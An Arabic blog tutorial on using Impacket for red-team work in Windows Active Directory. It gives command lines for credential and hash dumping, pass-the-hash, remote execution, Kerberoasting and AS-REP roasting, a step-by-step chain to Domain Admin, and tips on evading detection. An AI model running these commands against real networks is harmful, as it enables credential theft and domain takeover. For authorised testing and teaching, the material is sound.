---
layout: blog
title: "Impacket: السكاكين السويسرية للـ Red Team - دليل شامل لاستغلال بروتوكولات Windows"
date: 2026-04-01T06:24:56Z
category: "أداة"
excerpt: "في عالم الـ Red Teaming، تبرز Impacket كمكتبة Python لا غنى عنها لكل مختص أمني. توفر هذه الأداة مجموعة ضخمة من الوظائف للتفاعل مع بروتوكولات Windows الشبكية. من استخراج الهاشات إلى تنفيذ الأوامر عن بُعد، تُعد Impacket الخيار الأول عندما يتعلق الأمر بـ Post-Exploitation في بيئات Active Directory."
read_time: 8
tags: ["Impacket", "Red Team", "Active Directory", "Post Exploitation", "Python"]
slug: "impacket-guide"
image: "/OffsecAR/assets/images/blogs/impacket-guide.png"
---

## لماذا Impacket؟

عندما تحصل على موطئ قدم في شبكة Windows، تبدأ التحديات الحقيقية. تحتاج إلى التنقل، استخراج الأوثينتكيشن، والتحرك أفقيًا دون إثارة الشكوك. هنا يأتي دور Impacket.

طُورت Impacket بواسطة SecureAuth وهي مكتبة Python تُنفذ بروتوكولات شبكية متعددة بطريقة نقية تمامًا. لا تعتمد على أي مكتبات Windows خارجية، ما يعني أنك تستطيع مهاجمة نظام Windows من جهاز Linux أو macOS بكل سهولة.

القوة الحقيقية لـ Impacket تكمن في تغطيتها الشاملة: SMB، MSRPC، LDAP، Kerberos، وغيرها. كل بروتوكول تحتاجه للتحرك في بيئة Active Directory متوفر وجاهز للاستخدام.

## الأدوات الأساسية في الترسانة

### secretsdump.py: استخراج الكنوز

أول ما يبحث عنه أي Red Teamer هو credentials. أداة secretsdump تتيح لك استخراج NTLM hashes، Kerberos keys، وحتى LSA secrets مباشرة من Domain Controller أو أي نظام Windows.

```bash
# استخراج من Domain Controller عبر الشبكة
secretsdump.py domain/user:password@dc01.target.local

# استخراج من NTDS.dit محفوظ محليًا
secretsdump.py -ntds ntds.dit -system system.hive LOCAL

# استخراج باستخدام Pass-the-Hash
secretsdump.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 administrator@192.168.1.10
```

الأداة تدعم عدة طرق للـ Authentication، من الـ Cleartext passwords إلى Kerberos tickets، ما يجعلها مرنة للغاية.

### psexec.py وعائلته: التنفيذ عن بُعد

مجموعة أدوات التنفيذ عن بُعد في Impacket متنوعة ولكل منها حالات استخدام محددة:

```bash
# psexec: الكلاسيكي، يستخدم Service Control Manager
psexec.py domain/admin:password@target.local

# wmiexec: أقل ضجة، يستخدم WMI
wmiexec.py domain/admin:password@target.local

# smbexec: بديل آخر عبر SMB
smbexec.py domain/admin:password@target.local

# atexec: للتنفيذ عبر Task Scheduler
atexec.py domain/admin:password@target.local "whoami"
```

كل أداة تترك Artifacts مختلفة. wmiexec أكثر هدوءًا من psexec لأنه لا يكتب ملفات على القرص، بينما atexec مفيد لجدولة المهام.

## هجمات Kerberos المتقدمة

### GetUserSPNs.py: Kerberoasting

أحد أشهر هجمات Active Directory. تستخرج Service Tickets لحسابات الخدمة ثم تكسرها Offline:

```bash
# البحث عن SPN واستخراج TGS
GetUserSPNs.py domain/user:password -dc-ip 192.168.1.5 -request

# حفظ الهاشات مباشرة
GetUserSPNs.py domain/user:password -dc-ip 192.168.1.5 -request -outputfile hashes.txt

# ثم كسرها باستخدام hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

### GetNPUsers.py: AS-REP Roasting

استهداف الحسابات التي لا تتطلب Kerberos Pre-Authentication:

```bash
# فحص قائمة مستخدمين
GetNPUsers.py domain/ -usersfile users.txt -dc-ip 192.168.1.5 -format hashcat

# فحص دومين كامل (يتطلب credentials)
GetNPUsers.py domain/user:password -dc-ip 192.168.1.5 -request
```

## سيناريو عملي: من Zero إلى Domain Admin

لنفترض أنك حصلت على credentials لمستخدم عادي. إليك سير عمل نموذجي:

```bash
# 1. استكشاف الدومين والبحث عن SPN
GetUserSPNs.py CORP/user:pass -dc-ip 10.0.0.5 -request

# 2. كسر TGS الناتج والحصول على حساب خدمة
hashcat -m 13100 service.hash rockyou.txt

# 3. استخدام حساب الخدمة لـ DCSync
secretsdump.py CORP/svc_account:password@10.0.0.5 -just-dc-user Administrator

# 4. Pass-the-Hash للـ Administrator
psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee administrator@10.0.0.5
```

هذا المسار يوضح كيف تتكامل أدوات Impacket معًا لتشكيل Attack Chain متكاملة.

## نصائح للاستخدام الفعّال

**التخفي والـ OpSec**: wmiexec و dcomexec أقل إثارة للشبهات من psexec الذي يُنشئ خدمة جديدة. استخدم الأدوات المناسبة حسب مستوى المراقبة في البيئة المستهدفة.

**إدارة الـ Tickets**: احتفظ بـ Kerberos tickets في ملفات منفصلة باستخدام `-k` flag. هذا يسمح لك بإعادة استخدامها دون الحاجة لـ credentials مرة أخرى.

**التوثيق الكامل**: سجل كل أمر تنفذه. Impacket يولد بيانات كثيرة، والقدرة على إعادة تتبع خطواتك أمر حاسم في Engagements طويلة.

**الفهم العميق**: لا تستخدم الأدوات كـ Black Box. افهم البروتوكول الذي تستغله، الـ Artifacts التي تتركها، وكيف يمكن اكتشافك. هذا الفهم يفرق بين مهاجم ماهر ومستخدم Script Kiddie.

Impacket ليست مجرد مجموعة أدوات، بل منصة كاملة لفهم واستغلال بروتوكولات Windows. إتقانها يضعك خطوات للأمام في أي Red Team engagement.
